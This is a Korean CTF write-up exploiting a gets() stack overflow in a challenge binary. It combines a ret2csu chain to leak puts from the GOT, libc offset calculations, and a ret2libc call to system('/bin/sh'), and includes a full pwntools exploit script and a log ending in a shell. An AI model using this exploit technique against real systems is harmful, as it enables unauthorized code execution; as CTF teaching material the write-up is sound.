# gimme_your_shell

# binary

```asm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000400592 <+0>:	push   rbp
   0x0000000000400593 <+1>:	mov    rbp,rsp
   0x0000000000400596 <+4>:	sub    rsp,0x10
   0x000000000040059a <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x000000000040059d <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005a1 <+15>:	mov    eax,0x0
   0x00000000004005a6 <+20>:	call   0x400554 <vuln>
   0x00000000004005ab <+25>:	mov    edi,0x4006fb
   0x00000000004005b0 <+30>:	call   0x400430 <puts@plt>
   0x00000000004005b5 <+35>:	mov    edi,0x0
   0x00000000004005ba <+40>:	call   0x400460 <fflush@plt>
   0x00000000004005bf <+45>:	mov    eax,0x0
   0x00000000004005c4 <+50>:	leave  
   0x00000000004005c5 <+51>:	ret    
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x0000000000400554 <+0>:	push   rbp
   0x0000000000400555 <+1>:	mov    rbp,rsp
   0x0000000000400558 <+4>:	sub    rsp,0x10
   0x000000000040055c <+8>:	mov    edi,0x4006c0
   0x0000000000400561 <+13>:	call   0x400430 <puts@plt>
   0x0000000000400566 <+18>:	mov    edi,0x0
   0x000000000040056b <+23>:	call   0x400460 <fflush@plt>
   0x0000000000400570 <+28>:	lea    rax,[rbp-0x10]
   0x0000000000400574 <+32>:	mov    rdi,rax
   0x0000000000400577 <+35>:	call   0x400450 <gets@plt>
   0x000000000040057c <+40>:	mov    edi,0x4006eb
   0x0000000000400581 <+45>:	call   0x400430 <puts@plt>
   0x0000000000400586 <+50>:	mov    edi,0x0
   0x000000000040058b <+55>:	call   0x400460 <fflush@plt>
   0x0000000000400590 <+60>:	leave  
   0x0000000000400591 <+61>:	ret    
End of assembler dump.
```

`puts`를 이용해 ROP기법을 시도했다. 먼저 `puts`의 `got`를 찾았다

```asm
gdb-peda$ disass 0x400430
Dump of assembler code for function puts@plt:
   0x0000000000400430 <+0>:	jmp    QWORD PTR [rip+0x2005b2]        # 0x6009e8 <puts@got.plt>
   0x0000000000400436 <+6>:	push   0x0
   0x000000000040043b <+11>:	jmp    0x400420
End of assembler dump.
gdb-peda$ x/2wx 0x6009e8
0x6009e8 <puts@got.plt>:	0x00400436	0x00000000
```
`got = 0x6009e8`

 그 후 `puts`의 `offset`을 구했다
 
```asm
gdb-peda$ p puts
$1 = {<text variable, no debug info>} 0x7f9efc1e2690 <_IO_puts>
gdb-peda$ shell ps
   PID TTY          TIME CMD
 38310 pts/19   00:00:17 zsh
 52584 pts/19   00:00:00 gdb
 52607 pts/19   00:00:00 weak
 52620 pts/19   00:00:00 ps
gdb-peda$ shell cat /proc/52607/maps
00400000-00401000 r-xp 00000000 08:01 1320121                            /home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/4/weak
00600000-00601000 rwxp 00000000 08:01 1320121                            /home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/4/weak
7f9efc173000-7f9efc333000 r-xp 00000000 08:01 921381                     /lib/x86_64-linux-gnu/libc-2.23.so
7f9efc333000-7f9efc533000 ---p 001c0000 08:01 921381                     /lib/x86_64-linux-gnu/libc-2.23.so
7f9efc533000-7f9efc537000 r-xp 001c0000 08:01 921381                     /lib/x86_64-linux-gnu/libc-2.23.so
7f9efc537000-7f9efc539000 rwxp 001c4000 08:01 921381                     /lib/x86_64-linux-gnu/libc-2.23.so
7f9efc539000-7f9efc53d000 rwxp 00000000 00:00 0 
7f9efc53d000-7f9efc563000 r-xp 00000000 08:01 921353                     /lib/x86_64-linux-gnu/ld-2.23.so
7f9efc746000-7f9efc749000 rwxp 00000000 00:00 0 
7f9efc762000-7f9efc763000 r-xp 00025000 08:01 921353                     /lib/x86_64-linux-gnu/ld-2.23.so
7f9efc763000-7f9efc764000 rwxp 00026000 08:01 921353                     /lib/x86_64-linux-gnu/ld-2.23.so
7f9efc764000-7f9efc765000 rwxp 00000000 00:00 0 
7ffc0365c000-7ffc0367d000 rwxp 00000000 00:00 0                          [stack]
7ffc036f3000-7ffc036f6000 r--p 00000000 00:00 0                          [vvar]
7ffc036f6000-7ffc036f8000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
gdb-peda$ p 0x7f9efc1e2690 - 0x7f9efc173000
$2 = 0x6f690
```

`puts_offset = 0x6f690`

이와 같은 방법으로 `system` 함수와 `"/bin/sh"`의 `offset`도 구했다.

`system_offset = 0x45390`
`binsh_offset =  0x18cd57`

이 바이너리에서 Gadget을 찾아봤지만 나오지 않아서 Return-to-csu를 이용하기로 했다.

```asm
00000000004005d0 <__libc_csu_init>:
  4005d0:	48 89 6c 24 d8       	mov    QWORD PTR [rsp-0x28],rbp
  4005d5:	4c 89 64 24 e0       	mov    QWORD PTR [rsp-0x20],r12
  4005da:	48 8d 2d 2b 02 20 00 	lea    rbp,[rip+0x20022b]        # 60080c <__init_array_end>
  4005e1:	4c 8d 25 24 02 20 00 	lea    r12,[rip+0x200224]        # 60080c <__init_array_end>
  4005e8:	4c 89 6c 24 e8       	mov    QWORD PTR [rsp-0x18],r13
  4005ed:	4c 89 74 24 f0       	mov    QWORD PTR [rsp-0x10],r14
  4005f2:	4c 89 7c 24 f8       	mov    QWORD PTR [rsp-0x8],r15
  4005f7:	48 89 5c 24 d0       	mov    QWORD PTR [rsp-0x30],rbx
  4005fc:	48 83 ec 38          	sub    rsp,0x38
  400600:	4c 29 e5             	sub    rbp,r12
  400603:	41 89 fd             	mov    r13d,edi
  400606:	49 89 f6             	mov    r14,rsi
  400609:	48 c1 fd 03          	sar    rbp,0x3
  40060d:	49 89 d7             	mov    r15,rdx
  400610:	e8 eb fd ff ff       	call   400400 <_init>
  400615:	48 85 ed             	test   rbp,rbp
  400618:	74 1c                	je     400636 <__libc_csu_init+0x66>
  40061a:	31 db                	xor    ebx,ebx
  40061c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
  400620:	4c 89 fa             	mov    rdx,r15
  400623:	4c 89 f6             	mov    rsi,r14
  400626:	44 89 ef             	mov    edi,r13d
  400629:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
  40062d:	48 83 c3 01          	add    rbx,0x1
  400631:	48 39 eb             	cmp    rbx,rbp
  400634:	75 ea                	jne    400620 <__libc_csu_init+0x50>
  400636:	48 8b 5c 24 08       	mov    rbx,QWORD PTR [rsp+0x8]
  40063b:	48 8b 6c 24 10       	mov    rbp,QWORD PTR [rsp+0x10]
  400640:	4c 8b 64 24 18       	mov    r12,QWORD PTR [rsp+0x18]
  400645:	4c 8b 6c 24 20       	mov    r13,QWORD PTR [rsp+0x20]
  40064a:	4c 8b 74 24 28       	mov    r14,QWORD PTR [rsp+0x28]
  40064f:	4c 8b 7c 24 30       	mov    r15,QWORD PTR [rsp+0x30]
  400654:	48 83 c4 38          	add    rsp,0x38
  400658:	c3                   	ret    
  400659:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
```

`csu1 = 0x400636`, `csu2 = 0x400620`이다.

이 csu를 이용할 때 `r13 -> rdx`, `r14 -> rsi`, `r15d -> edi`, `call r12`가 되며 `rbp = 0x0`이여야 `call QWORD PTR [r12 + rbx*8]`을 실행할 때 `r12`를 실행할 수 있다. 또한 `csu2`를 이용하려면 `jne`를 거쳐야 `ret`까지 도달할 수 있으므로 `rbp = 0x1` 이여야 한다.

이로써 첫번째로 만들 스택 프레임은 다음과 같다.

Stack | Explanation | 
----- | ------
ret (csu1) | <-- rsp
dummy | dummy 8 bytes
rbx | 0x00
rbp | 0x01
r12 | puts_got
r13 | puts_got
r14 | dummy 8 bytes
r15 | dummy 8 bytes
ret (csu2) | ret of csu1
dummy | dummy ~ r15 of csu2 (8 * 7 bytes)
main | ret of csu2

위 ROP코드는 `puts@got`의 값을 출력한다. 이를 받아 `libc`의 실제 주소를 구할 수 있다.

이후 다시 `main`으로 돌아와 gets를 할 때 구성할 스택 프레임은 아래와 같다


Stack | Explanation | 
----- | ------
ret (pop rdi) | <-- rsp
"/bin/sh" | Argv1
ret (system) | system()

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

puts_got = 0x6009e8
puts_offset = 0x6f690

pop_rdi = 0x19dba5

system = 0x45390

binsh = 0x18cd57

libc = 0

main = 0x400554

csu1 = 0x40063b
csu2 = 0x400620

payload = 'a'*24

payload += p64(csu1)

payload += 'a'*8
payload += p64(0) + p64(1) + p64(puts_got) + p64(puts_got) + 'c'*8 + 'd'*8 + p64(csu2) + p64(main)*8

p = process('./weak')

p.sendline(payload)
p.recvuntil('Oh I remember !\n')
leak = p.recv(6)
print hexdump(leak)
leak = u64(leak + '\x00\x00')
print 'leaked: ' + hex(leak)
libc = leak - puts_offset
print 'libc: ' + hex(libc)

payload = 'a'*24
payload += p64(libc + pop_rdi) + p64(libc + binsh) + p64(libc + system)

p.sendline(payload)
p.interactive()
```

```bash
[+] Starting local process './weak': pid 52701
[DEBUG] Sent 0xa1 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  3b 06 40 00  00 00 00 00  │aaaa│aaaa│;·@·│····│
    00000020  61 61 61 61  61 61 61 61  00 00 00 00  00 00 00 00  │aaaa│aaaa│····│····│
    00000030  01 00 00 00  00 00 00 00  e8 09 60 00  00 00 00 00  │····│····│··`·│····│
    00000040  e8 09 60 00  00 00 00 00  63 63 63 63  63 63 63 63  │··`·│····│cccc│cccc│
    00000050  64 64 64 64  64 64 64 64  20 06 40 00  00 00 00 00  │dddd│dddd│ ·@·│····│
    00000060  54 05 40 00  00 00 00 00  54 05 40 00  00 00 00 00  │T·@·│····│T·@·│····│
    *
    000000a0  0a                                                  │·│
    000000a1
[DEBUG] Received 0x6d bytes:
    00000000  4f 6b 2c 20  6e 6f 77 20  67 69 76 65  20 6d 65 20  │Ok, │now │give│ me │
    00000010  74 68 65 20  6e 61 6d 65  20 6f 66 20  6f 75 72 20  │the │name│ of │our │
    00000020  70 72 65 73  69 64 65 6e  74 2e 0a 4f  68 20 49 20  │pres│iden│t.·O│h I │
    00000030  72 65 6d 65  6d 62 65 72  20 21 0a 90  06 54 47 7b  │reme│mber│ !··│·TG{│
    00000040  7f 0a 4f 6b  2c 20 6e 6f  77 20 67 69  76 65 20 6d  │··Ok│, no│w gi│ve m│
    00000050  65 20 74 68  65 20 6e 61  6d 65 20 6f  66 20 6f 75  │e th│e na│me o│f ou│
    00000060  72 20 70 72  65 73 69 64  65 6e 74 2e  0a           │r pr│esid│ent.│·│
    0000006d
00000000  90 06 54 47  7b 7f                                  │··TG│{·│
00000006
leaked: 0x7f7b47540690
libc: 0x7f7b474d1000
[DEBUG] Sent 0x31 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  a5 eb 66 47  7b 7f 00 00  │aaaa│aaaa│··fG│{···│
    00000020  57 dd 65 47  7b 7f 00 00  90 63 51 47  7b 7f 00 00  │W·eG│{···│·cQG│{···│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode

Ok, now give me the name of our president.
[DEBUG] Received 0x10 bytes:
    'Oh I remember !\n'
Oh I remember !
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x7 bytes:
    'ubuntu\n'
ubuntu
$ 
```